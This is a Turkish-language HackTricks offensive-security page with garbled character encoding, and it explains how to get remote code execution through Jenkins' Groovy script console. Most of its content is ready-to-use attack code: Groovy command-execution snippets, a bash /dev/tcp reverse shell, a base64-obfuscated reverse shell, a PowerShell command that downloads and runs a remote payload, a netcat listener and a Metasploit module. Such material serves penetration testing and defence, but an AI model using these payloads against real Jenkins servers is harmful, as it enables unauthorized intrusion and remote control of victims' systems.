# Jenkins Groovy Script ile Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Jenkins Groovy Script ile Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

Bu, Jenkins'te yeni bir proje oluÅŸturmaktan daha az gÃ¼rÃ¼ltÃ¼lÃ¼dÃ¼r.

1. _path\_jenkins/script_ dizinine gidin.
2. Metin kutusuna betiÄŸi girin.
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
AÅŸaÄŸÄ±daki komutu kullanarak bir komutu Ã§alÄ±ÅŸtÄ±rabilirsiniz: `cmd.exe /c dir`

**Linux** iÃ§in ise ÅŸunu yapabilirsiniz: **`"ls /".execute().text`**

Metin iÃ§inde _alÄ±ntÄ±lar_ ve _tek tÄ±rnaklar_ kullanmanÄ±z gerekiyorsa, yÃ¼kÃ¼ Ã§alÄ±ÅŸtÄ±rmak iÃ§in _"""PAYLOAD"""_ (Ã¼Ã§lÃ¼ Ã§ift tÄ±rnak) kullanabilirsiniz.

**BaÅŸka bir kullanÄ±ÅŸlÄ± groovy betiÄŸi** ÅŸudur (yerine \[KOMUT EKLEYÄ°N]):
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Linux'ta ters kabuk

Bir ters kabuk, hedef bir sisteme eriÅŸim saÄŸlamak iÃ§in kullanÄ±lan bir saldÄ±rÄ± tekniÄŸidir. Bu teknik, hedef sisteme bir kabuk sunucusu baÄŸlantÄ±sÄ± oluÅŸturarak saldÄ±rganÄ±n komutlarÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.

AÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyerek Linux'ta bir ters kabuk oluÅŸturabilirsiniz:

1. Ä°lk olarak, saldÄ±rganÄ±n dinleyeceÄŸi bir IP adresi ve port belirleyin. Ã–rneÄŸin, IP adresi 192.168.1.100 ve port 4444 olarak varsayalÄ±m.

2. ArdÄ±ndan, hedef sisteme bir ters kabuk oluÅŸturmak iÃ§in bir komut Ã§alÄ±ÅŸtÄ±rÄ±n. AÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

Bu komut, hedef sisteme bir ters kabuk oluÅŸturacak ve saldÄ±rganÄ±n komutlarÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±yacaktÄ±r.

3. Son olarak, saldÄ±rganÄ±n dinleme yapabilmesi iÃ§in bir kabuk sunucusu baÅŸlatÄ±n. Bu iÅŸlem iÃ§in Ã§eÅŸitli araÃ§lar kullanÄ±labilir, Ã¶rneÄŸin `netcat` veya `nc` komutu. AÅŸaÄŸÄ±daki komutu kullanarak `netcat` aracÄ±nÄ± kullanabilirsiniz:

```bash
nc -lvp 4444
```

Bu komut, saldÄ±rganÄ±n hedef sisteme baÄŸlanmasÄ±nÄ± saÄŸlayacak ve ters kabuk komutlarÄ±nÄ± almasÄ±na olanak tanÄ±yacaktÄ±r.

Bu adÄ±mlarÄ± takip ederek Linux'ta bir ters kabuk oluÅŸturabilir ve hedef sisteme eriÅŸim saÄŸlayabilirsiniz. Ancak, unutmayÄ±n ki bu tÃ¼r saldÄ±rÄ±lar yasa dÄ±ÅŸÄ±dÄ±r ve yalnÄ±zca yasal izinlerle gerÃ§ekleÅŸtirilmelidir.
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Windows'ta ters kabuk

Bir PS ters kabukla birlikte bir HTTP sunucusu hazÄ±rlayabilir ve Jeking'i kullanarak onu indirip Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### Script

Bu iÅŸlemi [**bu betikle**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py) otomatikleÅŸtirebilirsiniz.

Ters kabuk almak iÃ§in MSF'i kullanabilirsiniz:
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
